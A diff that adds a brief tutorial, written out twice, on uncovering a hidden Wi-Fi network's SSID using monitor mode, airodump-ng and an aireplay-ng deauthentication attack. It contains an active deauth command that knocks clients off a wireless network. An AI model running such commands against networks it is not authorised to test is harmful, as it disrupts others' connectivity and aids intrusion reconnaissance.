@@ -1,0 +1,48 @@
+Discover hidden SSID
+
+In this little tutorial, we will learn how to find the SSID of a hidden     
+Wifi network.                                                              
+
+1. Put the wireless adaptor in Monitor mode.
+$ sudo ifconfig wlan0 down
+$ sudo iwconfig wlan0 mode monitor
+$ sudo ifconfig wlan0 up
+
+2. Find hidden BSSID
+$ sudo airodump-ng wlan0mon
+>>> You will see <length: 0> in the ESSID field.
+
+3. Observe this BSSIS
+$ sudo airodump-ng --bssid <BSSID> -c <ch> wlan0
+
+4. Launch a deauth on BSSID
+$ sudo aireplay-ng -0 5 -a <BSSID> wlan0
+>>> The name of the network is fully visible into the airodump-ng (see 3.).
+
+>@
+>@###############################################################################
+>@# [ Discover hidden SSID ]                                                    #
+>@#                                                                             #
+>@# In this little tutorial, we will learn how to find the SSID of a hidden     #
+>@# Wifi network.                                                               #
+>@#-----------------------------------------------------------------------------#
+>@
+>@1. Put the wireless adaptor in Monitor mode.
+>@$ sudo ifconfig wlan0 down
+>@$ sudo iwconfig wlan0 mode monitor
+>@$ sudo ifconfig wlan0 up
+>@
+>@2. Find hidden BSSID
+>@$ sudo airodump-ng wlan0mon
+>@>>> You will see <length: 0> in the ESSID field.
+>@
+>@3. Observe this BSSIS
+>@$ sudo airodump-ng --bssid <BSSID> -c <ch> wlan0
+>@
+>@4. Launch a deauth on BSSID
+>@$ sudo aireplay-ng -0 5 -a <BSSID> wlan0
+>@>>> The name of the network is fully visible into the airodump-ng (see 3.).
+>@
+>@###############################################################################
+>@
+
